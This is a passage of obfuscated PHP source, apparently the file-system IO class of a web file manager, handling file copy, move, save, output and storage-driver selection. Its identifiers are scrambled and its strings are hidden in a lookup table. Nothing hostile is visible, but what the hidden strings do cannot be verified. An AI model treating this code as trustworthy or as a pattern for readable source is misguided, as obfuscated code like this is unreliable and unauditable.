$ûÓÓÑÙØ[] = trim(implode($ä¬Âä¤á[63], $Ù“•ç¯Ï)); } foreach ($À½¬§¼ö as $È¸–Ö×§ => $ğÖÂøôĞ) { $åÑÏıÍ— = str_replace($ä¬Âä¤á[1120] . $Ï…¬ªŸè . $ä¬Âä¤á[21], $ä¬Âä¤á[22], $È¸–Ö×§); $½ùÕÚ«¯ = str_replace(array($ä¬Âä¤á[127], $ä¬Âä¤á[942]), $ä¬Âä¤á[389], substr($ğÖÂøôĞ, stripos($ğÖÂøôĞ, $ä¬Âä¤á[264]))); if ($åÑÏıÍ— == $ä¬Âä¤á[1097]) { $íò…¯úÂ = $ä¬Âä¤á[1121] . $Ø»‰õ‚£ . $ä¬Âä¤á[1122]; } else { $íò…¯úÂ = (stripos($åÑÏıÍ—, $ä¬Âä¤á[21]) ? $ä¬Âä¤á[1123] : $ä¬Âä¤á[22]) . ($ä¬Âä¤á[1124] . $åÑÏıÍ— . $ä¬Âä¤á[1125] . $½ùÕÚ«¯); } $ûÓÓÑÙØ[] = $íò…¯úÂ; } $°™×—õÒ = array($ä¬Âä¤á[1126] . $Ï…¬ªŸè . $ä¬Âä¤á[1127], $ä¬Âä¤á[1128] . $Ï…¬ªŸè . $ä¬Âä¤á[1129], implode($ä¬Âä¤á[60] . PHP_EOL, $ûÓÓÑÙØ), $ä¬Âä¤á[1130]); $—¤©×Œ¾ = implode(PHP_EOL, $°™×—õÒ); if ($¿î©ÕÜ“ && $¿î©ÕÜ“ == $ä¬Âä¤á[796]) { return $—¤©×Œ¾; } $ï×‘Ãó = array($ä¬Âä¤á[796] => $—¤©×Œ¾, $ä¬Âä¤á[23] => $Ã·ÇÑÅÍ); return $¿î©ÕÜ“ ? $ï×‘Ãó[$¿î©ÕÜ“] : $ï×‘Ãó; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¹»ƒ»†å, $ôÑÌğ÷å) { $µÒ’Ÿü =& $_SERVER[¹àö™Ç¾]; $¾°¿€‚ = $ôÑÌğ÷å; $GLOBALS[$µÒ’Ÿü[1131]] = $µÒ’Ÿü[1132] . $¹»ƒ»†å; Hook::trigger($µÒ’Ÿü[1132] . $¹»ƒ»†å . $µÒ’Ÿü[1133], $¾°¿€‚); $»µéœÂÀ = self::driverMake($ôÑÌğ÷å[0]); if (!$»µéœÂÀ) { return !1; } if (method_exists($»µéœÂÀ, $¹»ƒ»†å)) { $—ÍçÉÎà = @call_user_func_array(array($»µéœÂÀ, $¹»ƒ»†å), $ôÑÌğ÷å); } else { if (method_exists($»µéœÂÀ, $µÒ’Ÿü[1134])) { $—ÍçÉÎà = @call_user_func_array(array($»µéœÂÀ, $¹»ƒ»†å), $ôÑÌğ÷å); } else { if (method_exists(self, $¹»ƒ»†å)) { $—ÍçÉÎà = @call_user_func_array(array(self, $¹»ƒ»†å), $ôÑÌğ÷å); } else { $—ÍçÉÎà = call_user_func_array(array(parent, $¹»ƒ»†å), $ôÑÌğ÷å); } } } Hook::trigger($µÒ’Ÿü[1132] . $¹»ƒ»†å . $µÒ’Ÿü[1135], $¾°¿€‚, $—ÍçÉÎà); return $—ÍçÉÎà; } public static function init($€Ñ¶ ‰) { return self::driverMake($€Ñ¶ ‰); } public static function copy($…Ûò‰ú°, $êæç¬°¾, $§§ğ“® = false, $îª¤Ø´µ = false) { return self::copyMoveStart($…Ûò‰ú°, $êæç¬°¾, $§§ğ“®, $_SERVER[¹àö™Ç¾][549], $îª¤Ø´µ); } public static function move($Ş´¼¨îÛ, $ÂÊê­æ, $ò­»§¢ = false, $‰²´µ¾€ = false) { return self::copyMoveStart($Ş´¼¨îÛ, $ÂÊê­æ, $ò­»§¢, $_SERVER[¹àö™Ç¾][551], $‰²´µ¾€); } private static function copyMoveStart($°¤Éğ÷İ, $ò—Õíü, $ÜÚô ŒŞ, $ñšó‹Áö, $çó©©Ğ») { $Ä÷ƒÛ‘ =& $_SERVER[¹àö™Ç¾]; $ŠÑøšÕ = array($°¤Éğ÷İ, $ò—Õíü, $ÜÚô ŒŞ, $çó©©Ğ»); Hook::trigger($Ä÷ƒÛ‘[1132] . $ñšó‹Áö . $Ä÷ƒÛ‘[1133], $ŠÑøšÕ); $ŸÖÜ„ = self::copyMove($°¤Éğ÷İ, $ò—Õíü, $ÜÚô ŒŞ, $ñšó‹Áö, $çó©©Ğ»); Hook::trigger($Ä÷ƒÛ‘[1132] . $ñšó‹Áö . $Ä÷ƒÛ‘[1135], $ŠÑøšÕ, $ŸÖÜ„); return $ŸÖÜ„; } public static function saveFile($Áßí×¦, $Ş¹£¤´ö, $€¹Ë°ï = true) { $½Îúûú” =& $_SERVER[¹àö™Ç¾]; $“âÄæ° = self::info($Ş¹£¤´ö); $ã‘œÙ…¨ = self::driverMake($Áßí×¦); $Ş¡æÓ€² = self::driverMake($Ş¹£¤´ö); $Òİ¤ŠŠ™ = !1; if ($Ş¡æÓ€²->pathParse[$½Îúûú”[1136]]) { $Òİ¤ŠŠ™ = $Ş¡æÓ€²; $‘ßóı½ = $Ş¡æÓ€²->pathParse[$½Îúûú”[1136]]; $Ş¡æÓ€² = self::driverMake($‘ßóı½); } if ($ã‘œÙ…¨->pathParse[$½Îúûú”[1136]]) { $°¸ÓííÂ = $ã‘œÙ…¨->pathParse[$½Îúûú”[1136]]; $ã‘œÙ…¨ = self::driverMake($°¸ÓííÂ); } $–©¡ÊËø = $Ş¡æÓ€²->pathFather($Ş¹£¤´ö); $ó¼Ã¡Ñ™ = !0; if (!$€¹Ë°ï && self::driverIsSame($ã‘œÙ…¨, $Ş¡æÓ€²)) { $ó¼Ã¡Ñ™ = !1; } $ÏÕûï = self::copyFile($ã‘œÙ…¨, $Áßí×¦, $Ş¡æÓ€², $–©¡ÊËø, $“âÄæ°[$½Îúûú”[42]], $ó¼Ã¡Ñ™); if ($Òİ¤ŠŠ™) { $ÏÕûï = $Òİ¤ŠŠ™->getPathOuter($ÏÕûï); } return $ÏÕûï; } private static function copyMove($µí®Óˆş, $­È²ËÏ×, $ç’øÈÖâ, $™×©ÊÌŒ, $ßìë¢•Œ = false) { $ÎÒıî¬ò =& $_SERVER[¹àö™Ç¾]; if (!$µí®Óˆş || $µí®Óˆş == $ÎÒıî¬ò[18] || !$­È²ËÏ×) { return !1; } ignore_timeout(); $Å÷¥Ñ»È = self::driverMake($µí®Óˆş); $ƒ´°Äã = self::driverMake($­È²ËÏ×); $øáİ‡ = $™×©ÊÌŒ == $ÎÒıî¬ò[551]; $˜æˆü£ú = !1; if ($ƒ´°Äã->pathParse[$ÎÒıî¬ò[1136]]) { $˜æˆü£ú = $ƒ´°Äã; $­È²ËÏ× = $ƒ´°Äã->pathParse[$ÎÒıî¬ò[1136]]; $ƒ´°Äã = self::driverMake($­È²ËÏ×); } if ($Å÷¥Ñ»È->pathParse[$ÎÒıî¬ò[1136]]) { $µí®Óˆş = $Å÷¥Ñ»È->pathParse[$ÎÒıî¬ò[1136]]; $Å÷¥Ñ»È = self::driverMake($µí®Óˆş); } self::check($Å÷¥Ñ»È, $µí®Óˆş, $ƒ´°Äã, $­È²ËÏ×); Hook::trigger($ÎÒıî¬ò[85], $Å÷¥Ñ»È, $µí®Óˆş, $ƒ´°Äã, $­È²ËÏ×); $ú¡Áß¿ = self::driverIsSame($Å÷¥Ñ»È, $ƒ´°Äã); if ($ú¡Áß¿) { if ($™×©ÊÌŒ == $ÎÒıî¬ò[551] && !method_exists($ƒ´°Äã, $ÎÒıî¬ò[1137]) && trim($­È²ËÏ×, $ÎÒıî¬ò[18]) == trim($ƒ´°Äã->pathFather($µí®Óˆş), $ÎÒıî¬ò[18])) { if ($Å÷¥Ñ»È->pathThis($µí®Óˆş) != $ßìë¢•Œ && !$Å÷¥Ñ»È->isTypeObject()) { return $Å÷¥Ñ»È->rename($µí®Óˆş, $ßìë¢•Œ); } return $ƒ´°Äã->getPathOuter($µí®Óˆş); } if (method_exists($ƒ´°Äã, $™×©ÊÌŒ)) { return $ƒ´°Äã->{$™×©ÊÌŒ}($µí®Óˆş, $­È²ËÏ×, $ç’øÈÖâ, $ßìë¢•Œ); } } if ($ú¡Áß¿ && $™×©ÊÌŒ == $ÎÒıî¬ò[551] && $ƒ´°Äã->getType() == $ÎÒıî¬ò[117]) { $¸üæø–¸ = $ƒ´°Äã->movePath($µí®Óˆş, $­È²ËÏ×, $ßìë¢•Œ); if ($¸üæø–¸) { return $¸üæø–¸; } } $¬ª“Ÿ¿† = $Å÷¥Ñ»È->isFile($µí®Óˆş); if (!$¬ª“Ÿ¿† && $ƒ´°Äã->getType() == $ÎÒıî¬ò[750] && $Å÷¥Ñ»È->getType() == $ÎÒıî¬ò[117]) { $¸üæø–¸ = $ƒ´°Äã->copyFolderFromIO($Å÷¥Ñ»È, $µí®Óˆş, $­È²ËÏ×, $ç’øÈÖâ, $øáİ‡, $ßìë¢•Œ); } else { $¸üæø–¸ = self::copyPath($Å÷¥Ñ»È, $µí®Óˆş, $ƒ´°Äã, $­È²ËÏ×, $ç’øÈÖâ, $øáİ‡, $¬ª“Ÿ¿†, $ßìë¢•Œ); } if ($¸üæø–¸ && $øáİ‡) { $Å÷¥Ñ»È->remove($µí®Óˆş); } if ($˜æˆü£ú) { $¸üæø–¸ = $˜æˆü£ú->getPathOuter($¸üæø–¸); } return $¸üæø–¸; } private static function check($ó§¨¾ÀÎ, $˜éô ‘Ç, $Ó¤¾—¤¤, &$²«Í²Ò‰) { $±Ï–ñÖ =& $_SERVER[¹àö™Ç¾]; if (self::driverIsSame($ó§¨¾ÀÎ, $Ó¤¾—¤¤) && $ó§¨¾ÀÎ->isFolder($˜éô ‘Ç) && $ó§¨¾ÀÎ->isParentOf($˜éô ‘Ç, $²«Í²Ò‰)) { show_json(LNG($±Ï–ñÖ[1138]), !1); } if (!$ó§¨¾ÀÎ->exist($˜éô ‘Ç)) { show_json(LNG($±Ï–ñÖ[116]), !1); } } private static function copyPath($¡ş»‘’ş, $ÒÏôóÒ®, $ô§Ôºüˆ, $·„’ô³Ø, $š©á¸ÙŸ, $´üä…Ø, $”ÆüµÒ¯, $ÑÃ©Æèğ = false) { $ÚÄ…Úİ© =& $_SERVER[¹àö™Ç¾]; $‘Éïòø = empty($ÑÃ©Æèğ) && $ÑÃ©Æèğ !== $ÚÄ…Úİ©[200] ? $¡ş»‘’ş->pathThis($ÒÏôóÒ®) : $ÑÃ©Æèğ; if ($š©á¸ÙŸ) { $Üæ¹òØ† = $ô§Ôºüˆ->fileNameExist($·„’ô³Ø, $‘Éïòø); $‘Éïòø = $ô§Ôºüˆ->fileNameAuto($·„’ô³Ø, $‘Éïòø, $š©á¸ÙŸ, !$”ÆüµÒ¯); $š©á¸ÙŸ = $Üæ¹òØ† ? $š©á¸ÙŸ : !1; } if ($”ÆüµÒ¯) { return self::copyFile($¡ş»‘’ş, $ÒÏôóÒ®, $ô§Ôºüˆ, $·„’ô³Ø, $‘Éïòø, $´üä…Ø); } if ($š©á¸ÙŸ == REPEAT_RENAME_FOLDER) { $š©á¸ÙŸ = !1; } $ø¸ó´Ï¢ = rtrim($·„’ô³Ø, $ÚÄ…Úİ©[18]) . $ÚÄ…Úİ©[18] . $‘Éïòø; $ç‘çã¸Ö = $ô§Ôºüˆ->mkdir($ô§Ôºüˆ->getPath($ø¸ó´Ï¢)); $·„’ô³Ø = $ô§Ôºüˆ->getPathInner($ç‘çã¸Ö); $®œÈ§è× = $¡ş»‘’ş->listPath($ÒÏôóÒ®, !0); $®œÈ§è× = is_array($®œÈ§è×) ? $®œÈ§è× : array($ÚÄ…Úİ©[86] => array(), $ÚÄ…Úİ©[87] => array()); $ì¹°ßË¥ = array_merge($®œÈ§è×[$ÚÄ…Úİ©[86]], $®œÈ§è×[$ÚÄ…Úİ©[87]]); foreach ($ì¹°ßË¥ as $ ÅÅ¹Çè) { $­âøÕí“ = $ ÅÅ¹Çè[$ÚÄ…Úİ©[43]] == $ÚÄ…Úİ©[202]; $ÒÏôóÒ® = $¡ş»‘’ş->getPathInner($ ÅÅ¹Çè[$ÚÄ…Úİ©[88]]); $ŒÇŒŸ‹É = self::copyPath($¡ş»‘’ş, $ÒÏôóÒ®, $ô§Ôºüˆ, $·„’ô³Ø, $š©á¸ÙŸ, $´üä…Ø, $­âøÕí“); if (!$ŒÇŒŸ‹É) { IO::errorTips($ÚÄ…Úİ©[1139] . $ÒÏôóÒ® . $ÚÄ…Úİ©[80] . $·„’ô³Ø); } } self::copyMoveKeepInfo($¡ş»‘’ş, $ÒÏôóÒ®, $ç‘çã¸Ö); return $ç‘çã¸Ö; } private static function copyFile($û¹ä†•ß, $×Çıô€Ã, $¼‡¼—Ÿ, $ÈœÈ£Ñ, $Î¤úä†, $ìÜÕÔòê) { $¸°úÈ¹ß =& $_SERVER[¹àö™Ç¾]; $ÈœÈ£Ñ = $¼‡¼—Ÿ->getPath(rtrim($ÈœÈ£Ñ, $¸°úÈ¹ß[18]) . $¸°úÈ¹ß[18] . $Î¤úä†); $ıŠĞÜ£¢ = $¸°úÈ¹ß[1140] . time() . rand_string(5); Hook::trigger($¸°úÈ¹ß[1141], $û¹ä†•ß, $×Çıô€Ã, $¼‡¼—Ÿ, $ÈœÈ£Ñ, $Î¤úä†, $ıŠĞÜ£¢); if (self::driverIsSame($û¹ä†•ß, $¼‡¼—Ÿ)) { if ($ìÜÕÔòê) { $¥©Õ¡ = $¼‡¼—Ÿ->moveFile($×Çıô€Ã, $ÈœÈ£Ñ); } else { $¥©Õ¡ = $¼‡¼—Ÿ->copyFile($×Çıô€Ã, $ÈœÈ£Ñ); } Hook::trigger($¸°úÈ¹ß[1142], $û¹ä†•ß, $×Çıô€Ã, $¼‡¼—Ÿ, $ÈœÈ£Ñ, $Î¤úä†, $¥©Õ¡); self::copyMoveKeepInfo($û¹ä†•ß, $×Çıô€Ã, $¥©Õ¡); return $¥©Õ¡; } $»ÁÎ†™ = TEMP_FILES; if ($GLOBALS[$¸°úÈ¹ß[16]][$¸°úÈ¹ß[100]][$¸°úÈ¹ß[788]]) { $»ÁÎ†™ = $GLOBALS[$¸°úÈ¹ß[16]][$¸°úÈ¹ß[100]][$¸°úÈ¹ß[788]]; } $€Ÿ£°É = $»ÁÎ†™; mk_dir($€Ÿ£°É); $é¼®àÅ½ = $€Ÿ£°É . $ıŠĞÜ£¢; $‹ë“ú¡Û = $é¼®àÅ½; $é¼®àÅ½ = $û¹ä†•ß->download($×Çıô€Ã, $é¼®àÅ½); $é¼®àÅ½ = $û¹ä†•ß->iconvApp($é¼®àÅ½); if (substr($é¼®àÅ½, strlen($»ÁÎ†™)) == $»ÁÎ†™) { $ìÜÕÔòê = !0; } $¥©Õ¡ = $¼‡¼—Ÿ->upload($ÈœÈ£Ñ, $é¼®àÅ½, $ìÜÕÔòê); self::remove($‹ë“ú¡Û); Hook::trigger($¸°úÈ¹ß[1142], $û¹ä†•ß, $×Çıô€Ã, $¼‡¼—Ÿ, $ÈœÈ£Ñ, $Î¤úä†, $¥©Õ¡); self::copyMoveKeepInfo($û¹ä†•ß, $×Çıô€Ã, $¥©Õ¡); return $¥©Õ¡; } private static function copyMoveKeepInfo($şÕ¬·šÆ, $ê¡ï‘Ãë, $¦äÊëÕ) { if (!$¦äÊëÕ) { return; } $Ø¹âøµ… = $şÕ¬·šÆ->info($ê¡ï‘Ãë); if (!is_array($Ø¹âøµ…)) { return; } IO::setModifyTime($¦äÊëÕ, $Ø¹âøµ…[$_SERVER[¹àö™Ç¾][96]]); } public static function pathFather($½ø‰€©Á) { $Şº ‡İ = IO::init($½ø‰€©Á); $ëñğ¥ÚÏ = $Şº ‡İ->pathFather($Şº ‡İ->path); return $Şº ‡İ->getPathOuter($ëñğ¥ÚÏ); } public static function fileOut($øÖ¾ë’, $Š…×ù¤ = false, $ş…û¾÷ = false, $¹®óšú  = '') { $èƒò´°÷ = self::driverMake($øÖ¾ë’); if ($èƒò´°÷->isFileOutServer()) { return $èƒò´°÷->fileOutServer($øÖ¾ë’, $Š…×ù¤, $ş…û¾÷, $¹®óšú ); } return $èƒò´°÷->fileOut($øÖ¾ë’, $Š…×ù¤, $ş…û¾÷, $¹®óšú ); } public static function fileOutImage($³Ãª¹Ì, $ä¾¡³ØÓ = 250) { $îø‚¤ïÈ = array(250, 600, 1200, 2000, 3000, 5000); for ($˜ÈÍ—ë = 0; $˜ÈÍ—ë < count($îø‚¤ïÈ); $˜ÈÍ—ë++) { if ($˜ÈÍ—ë == 0 && $ä¾¡³ØÓ <= $îø‚¤ïÈ[$˜ÈÍ—ë]) { $ä¾¡³ØÓ = $îø‚¤ïÈ[$˜ÈÍ—ë]; break; } else { if ($ä¾¡³ØÓ > $îø‚¤ïÈ[$˜ÈÍ—ë - 1] && $ä¾¡³ØÓ <= $îø‚¤ïÈ[$˜ÈÍ—ë]) { $ä¾¡³ØÓ = $îø‚¤ïÈ[$˜ÈÍ—ë]; break; } else { if ($˜ÈÍ—ë == count($îø‚¤ïÈ) - 1 && $ä¾¡³ØÓ > $îø‚¤ïÈ[$˜ÈÍ—ë]) { $ä¾¡³ØÓ = $îø‚¤ïÈ[$˜ÈÍ—ë]; break; } } } } $†ü¸Ó–å = self::driverMake($³Ãª¹Ì); if ($†ü¸Ó–å->isFileOutServer()) { return $†ü¸Ó–å->fileOutImageServer($³Ãª¹Ì, $ä¾¡³ØÓ); } return $†ü¸Ó–å->fileOutImage($³Ãª¹Ì, $ä¾¡³ØÓ); } private static function driverIsSame($ùêñÓìö, $¦ÛûĞşÚ) { $±æƒå‰¡ =& $_SERVER[¹àö™Ç¾]; $û‘ææ–ù = $ùêñÓìö->getType(); $ÃŸŠÁƒ¤ = $¦ÛûĞşÚ->getType(); if ($û‘ææ–ù != $ÃŸŠÁƒ¤) { return !1; } if ($û‘ææ–ù == $±æƒå‰¡[750]) { return !0; } if ($û‘ææ–ù == $±æƒå‰¡[117]) { return !0; } if ($ùêñÓìö->pathDriver == $¦ÛûĞşÚ->pathDriver) { return !0; } return !1; } public static function copyUpdate($âøÓµ¶å, $”½¿Ü‚Å) { $­”Ö¤û =& $_SERVER[¹àö™Ç¾]; if (!IO::exist($âøÓµ¶å)) { return !1; } if (!IO::exist($”½¿Ü‚Å)) { IO::mkdir($”½¿Ü‚Å); } $ôšÊË³û = self::_listAll($âøÓµ¶å); $ÇÜ¯°…û = self::_listAll($”½¿Ü‚Å); $­¦ÚÂÚ´ = array(); $üäÍ–çÜ = array(); foreach ($ôšÊË³û as $˜­÷şá¡ => $Î“ĞàÃ) { if (isset($ÇÜ¯°…û[$˜­÷şá¡])) { if ($Î“ĞàÃ[$­”Ö¤û[89]] == 1) { continue; } if ($ÇÜ¯°…û[$˜­÷şá¡][$­”Ö¤û[90]] == $Î“ĞàÃ[$­”Ö¤û[90]]) { continue; } } if ($Î“ĞàÃ[$­”Ö¤û[89]] == 1) { $üäÍ–çÜ[] = $”½¿Ü‚Å . $­”Ö¤û[18] . $˜­÷şá¡; continue; } $Ö…Ğ÷Ù = strstr(trim($˜­÷şá¡, $­”Ö¤û[18]), $­”Ö¤û[18]) ? get_path_father($˜­÷şá¡) : $­”Ö¤û[22]; $­¦ÚÂÚ´[] = array($­”Ö¤û[1143] => $Î“ĞàÃ[$­”Ö¤û[88]], $­”Ö¤û[1144] => rtrim($”½¿Ü‚Å, $­”Ö¤û[18]) . $­”Ö¤û[18] . $Ö…Ğ÷Ù, $­”Ö¤û[1145] => $Î“ĞàÃ); } $¦İğ¸¨é = array($­”Ö¤û[202] => $­¦ÚÂÚ´, $­”Ö¤û[89] => $üäÍ–çÜ); Hook::trigger($­”Ö¤û[1146], $âøÓµ¶å, $”½¿Ü‚Å, $¦İğ¸¨é); foreach ($üäÍ–çÜ as $Î“ĞàÃ) { IO::mkdir($Î“ĞàÃ); } foreach ($­¦ÚÂÚ´ as $Î“ĞàÃ) { IO::copy($Î“ĞàÃ[$­”Ö¤û[1143]], $Î“ĞàÃ[$­”Ö¤û[1144]], REPEAT_REPLACE); } } private static function _listAll($œğ…ªÑ™) { $í¦ÓŒÔÎ =& $_SERVER[¹àö™Ç¾]; $œğ…ªÑ™ = KodIO::clear($œğ…ªÑ™); $ÁØÜœ­¤ = IO::listAll($œğ…ªÑ™); foreach ($ÁØÜœ­¤ as &$”î„•ƒÄ) { $Âá®Û¦ç = substr($”î„•ƒÄ[$í¦ÓŒÔÎ[88]], strlen($œğ…ªÑ™)); $”î„•ƒÄ[$í¦ÓŒÔÎ[1147]] = trim($Âá®Û¦ç, $í¦ÓŒÔÎ[18]); } unset($”î„•ƒÄ); return array_to_keyvalue($ÁØÜœ­¤, $í¦ÓŒÔÎ[1147]); } public static function fileSubstr($äµÍ‘Ëı, $¤ç­êÁé, $Ô‹ı®®õ = false) { $´²úÄ• =& $_SERVER[¹àö™Ç¾]; $Çòø°½ = self::driverMake($äµÍ‘Ëı); $°¡“ô¾ = $Çòø°½->size($äµÍ‘Ëı); $óÒ¥Şñ¬ = $¤ç­êÁé; $Ùâ“Äòæ = $Ô‹ı®®õ; if ($¤ç­êÁé < 0) { $¤ç­êÁé = $°¡“ô¾ + $¤ç­êÁé; } if ($Ô‹ı®®õ === !1) { $Ô‹ı®®õ = $°¡“ô¾ - $¤ç­êÁé; } if ($¤ç­êÁé + $Ô‹ı®®õ > $°¡“ô¾) { $Ô‹ı®®õ = $°¡“ô¾ - $¤ç­êÁé; } if (!$°¡“ô¾ && $Çòø°½->getType() == $´²úÄ•[117] && !$Çòø°½->exist($äµÍ‘Ëı)) { throw new Exception($´²úÄ•[1148] . LNG($´²úÄ•[1149]) . $´²úÄ•[951] . get_path_this($äµÍ‘Ëı) . $´²úÄ•[22]); } if ($Ô‹ı®®õ <= 0) { return $´²úÄ•[22]; } if ($¤ç­êÁé < 0 || $¤ç­êÁé >= $°¡“ô¾ || $Ô‹ı®®õ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\122\x65\141\144\40\145\x72\x72\157\x72\41\40\163\x74\141\x72\164\x3d{$¤ç­êÁé}\73\x6c\x65\156\x67\x74\x68\75{$Ô‹ı®®õ}\x3b\x20\x73\151\172\145\x3d{$°¡“ô¾}\x3b"); } $ùİúÁ„ = $Çòø°½->fileSubstr($äµÍ‘Ëı, $¤ç­êÁé, $Ô‹ı®®õ); if (!$ùİúÁ„ && $Ô‹ı®®õ && isset($GLOBALS[$´²úÄ•[1150]])) { throw new Exception($GLOBALS[$´²úÄ•[1150]][$´²úÄ•[1151]]); } return $ùİúÁ„; } private static function driverMake(&$®Ï¡¢ë) { $½ÁìÓÙ„ =& $_SERVER[¹àö™Ç¾]; $¶Ô¢ßàİ = KodIO::parse($®Ï¡¢ë); if (!self::$driverListSystem) { $é©¾¹ = Model($½ÁìÓÙ„[759])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($é©¾¹, $½ÁìÓÙ„[401]); } if ($¶Ô¢ßàİ[$½ÁìÓÙ„[43]] == KodIO::KOD_IO && !self::$driverListSystem[$¶Ô¢ßàİ[$½ÁìÓÙ„[401]]]) { return !1; } $®Ï¡¢ë = $¶Ô¢ßàİ[$½ÁìÓÙ„[1152]]; $½Ûßí¯Ş = self::driverGet($¶Ô¢ßàİ, $®Ï¡¢ë); return $½Ûßí¯Ş; } private static function driverGet($²ĞÀõƒ¢, &$Ô„”ÇÀ™) { $˜•ù§ƒ­ =& $_SERVER[¹àö™Ç¾]; $ÇÔ©–ıª = $²ĞÀõƒ¢[$˜•ù§ƒ­[1153]]; $á€…•°É = $²ĞÀõƒ¢[$˜•ù§ƒ­[401]]; switch ($²ĞÀõƒ¢[$˜•ù§ƒ­[43]]) { case KodIO::KOD_IO: $Æ¡¸©¼Ü = self::$driverListSystem[$á€…•°É]; break; case KodIO::KOD_SOURCE: $Ô„”ÇÀ™ = $á€…•°É . $Ô„”ÇÀ™; $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1155], $˜•ù§ƒ­[16] => $²ĞÀõƒ¢); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¨˜­ïÕÏ = $GLOBALS[$˜•ù§ƒ­[1156]]; self::$driverListUser = array_to_keyvalue($¨˜­ïÕÏ, $˜•ù§ƒ­[401]); } $Æ¡¸©¼Ü = self::$driverListUser[$á€…•°É]; break; case KodIO::KOD_SHARE_LINK: $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1157], $˜•ù§ƒ­[16] => $²ĞÀõƒ¢); $ëÜÓ¦Ëó = Action($˜•ù§ƒ­[1158])->sharePathInfo($²ĞÀõƒ¢[$˜•ù§ƒ­[88]]); $Ô„”ÇÀ™ = $ëÜÓ¦Ëó[$˜•ù§ƒ­[403]]; if (!$ëÜÓ¦Ëó[$˜•ù§ƒ­[403]]) { $åŒå¥áï = Model($˜•ù§ƒ­[595])->getInfo($ëÜÓ¦Ëó[$˜•ù§ƒ­[488]]); $Ô„”ÇÀ™ = KodIO::clear($åŒå¥áï[$˜•ù§ƒ­[1159]] . $²ĞÀõƒ¢[$˜•ù§ƒ­[1152]]); $²ĞÀõƒ¢[$˜•ù§ƒ­[486]] = $åŒå¥áï; $²ĞÀõƒ¢[$˜•ù§ƒ­[1136]] = $Ô„”ÇÀ™; $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1160], $˜•ù§ƒ­[16] => $²ĞÀõƒ¢); } break; case KodIO::KOD_SHARE_ITEM: $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1161], $˜•ù§ƒ­[16] => $²ĞÀõƒ¢); $åŒå¥áï = Model($˜•ù§ƒ­[595])->getInfo($²ĞÀõƒ¢[$˜•ù§ƒ­[401]]); if ($åŒå¥áï[$˜•ù§ƒ­[403]] == $˜•ù§ƒ­[200]) { $Ô„”ÇÀ™ = KodIO::clear($åŒå¥áï[$˜•ù§ƒ­[1159]] . $²ĞÀõƒ¢[$˜•ù§ƒ­[1152]]); $²ĞÀõƒ¢[$˜•ù§ƒ­[486]] = $åŒå¥áï; $²ĞÀõƒ¢[$˜•ù§ƒ­[1136]] = $Ô„”ÇÀ™; $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1162], $˜•ù§ƒ­[16] => $²ĞÀõƒ¢); } else { if (!$Ô„”ÇÀ™) { $Ô„”ÇÀ™ = $åŒå¥áï[$˜•ù§ƒ­[403]]; } } break; default: $Ô„”ÇÀ™ = $²ĞÀõƒ¢[$˜•ù§ƒ­[88]]; $Æ¡¸©¼Ü = array($˜•ù§ƒ­[1154] => $˜•ù§ƒ­[1163]); break; } $ğïüÓ—‘ = $²ĞÀõƒ¢[$˜•ù§ƒ­[88]]; if (!isset(self::$driverCache[$ğïüÓ—‘])) { $ãŞ¯©–‰ = strtolower($Æ¡¸©¼Ü[$˜•ù§ƒ­[106]]); $Ñ«Ã‰º = $GLOBALS[$˜•ù§ƒ­[16]][$˜•ù§ƒ­[100]][$˜•ù§ƒ­[818]]; $ëû›öĞÍ = $˜•ù§ƒ­[84] . (isset($Ñ«Ã‰º[$ãŞ¯©–‰]) ? $Ñ«Ã‰º[$ãŞ¯©–‰] : ucfirst($ãŞ¯©–‰)); if (!class_exists($ëû›öĞÍ)) { show_json("{$ëû›öĞÍ}\x20\156\157\x74\x20\145\x78\151\x73\164\163\x21", !1); } $Ôóº£¹­ = isset($Æ¡¸©¼Ü[$˜•ù§ƒ­[16]]) ? $Æ¡¸©¼Ü[$˜•ù§ƒ­[16]] : !1; self::$driverCache[$ğïüÓ—‘] = new $ëû›öĞÍ($Ôóº£¹­); } $²ºåÇé = self::$driverCache[$ğïüÓ—‘]; $²ºåÇé->pathDriver = $ÇÔ©–ıª; $²ºåÇé->pathBase = $˜•ù§ƒ­[22]; if (isset($Æ¡¸©¼Ü[$˜•ù§ƒ­[16]][$˜•ù§ƒ­[1164]])) { $²ºåÇé->pathBase = rtrim($Æ¡¸©¼Ü[$˜•ù§ƒ­[16]][$˜•ù§ƒ­[1164]], $˜•ù§ƒ­[18]) . $˜•ù§ƒ­[18]; $Ô„”ÇÀ™ = $²ºåÇé->pathBase . ltrim($Ô„”ÇÀ™, $˜•ù§ƒ­[18]); } $Ô„”ÇÀ™ = $²ºåÇé->getPath($Ô„”ÇÀ™); if (isset($²ĞÀõƒ¢[$˜•ù§ƒ­[1136]])) { $Ô„”ÇÀ™ = $²ĞÀõƒ¢[$˜•ù§ƒ­[1136]]; } $²ºåÇé->path = $Ô„”ÇÀ™; return $²ºåÇé; } public static function errorTips($…à·Ìê³ = false) { $”Á­†ó =& $_SERVER[¹àö™Ç¾]; static $à„•ÙÆ  = array(); $¼ëæòáê = 1000; if ($…à·Ìê³ === -1) { return $à„•ÙÆ  ? $à„•ÙÆ [count($à„•ÙÆ ) - 1] : $”Á­†ó[22]; } if ($…à·Ìê³ === !1) { return implode($”Á­†ó[11], $à„•ÙÆ ); } if (count($à„•ÙÆ ) >= $¼ëæòáê) { $à„•ÙÆ  = array_slice($à„•ÙÆ , $¼ëæòáê * 0.5, $¼ëæòáê); } $à„•ÙÆ [] = $…à·Ìê³; write_log($”Á­†ó[169] . ACTION . $”Á­†ó[1165] . $…à·Ìê³, $”Á­†ó[1166]); } public static function getLastError($´¡ÛÅÁ = '') { $ºÔµÊ¥Ş = self::errorTips(-1); return $ºÔµÊ¥Ş ? $ºÔµÊ¥Ş : $´¡ÛÅÁ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ìÏàÜÔ; if (!$ìÏàÜÔ) { $–µ£ì¬ú = IO::init($_SERVER[¹àö™Ç¾][18]); } return 